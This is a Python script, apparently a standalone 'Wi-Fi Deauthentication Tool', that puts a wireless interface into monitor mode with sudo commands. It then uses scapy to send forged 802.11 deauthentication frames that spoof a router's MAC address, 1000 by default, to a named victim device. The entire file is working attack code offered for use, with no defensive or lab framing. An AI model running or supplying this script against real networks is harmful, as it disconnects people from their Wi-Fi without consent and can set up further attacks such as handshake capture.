import argparse
import subprocess
import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

def enable_monitor_mode(interface):
    try:
        print(f"[!] Enabling monitor mode on {interface}...")
        subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["sudo", "iw", interface, "set", "monitor", "control"], check=True)
        subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)
        print(f"[+] {interface} is now in monitor mode.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to set monitor mode: {e}")
        sys.exit(1)

def send_deauth(target_mac, router_mac, iface="wlan0", packet_count=1000):
    dot11 = Dot11(addr1=target_mac, addr2=router_mac, addr3=router_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

    print(f"[+] Sending {packet_count} deauth packets to {target_mac} from {router_mac} on {iface}")
    sendp(packet, inter=0.1, count=packet_count, iface=iface, verbose=1)

if __name__ == "__main__":
    # ASCII Art Banner
    ascii_art = r"""
   _____ _ ____                   __  __  
  / ___/(_) / /______ ___  ____  / /_/ /_ 
  \__ \/ / / //_/ __ `__ \/ __ \/ __/ __ \
 ___/ / / / ,< / / / / / / /_/ / /_/ / / /
/____/_/_/_/|_/_/ /_/ /_/\____/\__/_/ /_/ 
                                          
        Wi-Fi Deauthentication Tool
         By Panagiotis Fassaris
    """
    print(ascii_art)

    # Argument parsing
    parser = argparse.ArgumentParser(description="Wi-Fi Deauthentication Attack Script")
    parser.add_argument("target_mac", help="MAC address of the target device (victim)")
    parser.add_argument("router_mac", help="MAC address of the router (access point)")
    parser.add_argument("-i", "--interface", default="wlan0", help="Wireless interface to use (default: wlan0)")
    parser.add_argument("-p", "--packets", type=int, default=1000, help="Number of deauth packets to send (default: 1000)")
    parser.add_argument("--auto-monitor", action="store_true", help="Automatically enable monitor mode on the interface")

    args = parser.parse_args()

    # Ask or enable monitor mode
    if args.auto_monitor:
        enable_monitor_mode(args.interface)
    else:
        confirm = input(f"Do you want to enable monitor mode on {args.interface}? [y/N]: ").strip().lower()
        if confirm == 'y':
            enable_monitor_mode(args.interface)

    # Launch attack
    send_deauth(args.target_mac, args.router_mac, iface=args.interface, packet_count=args.packets)
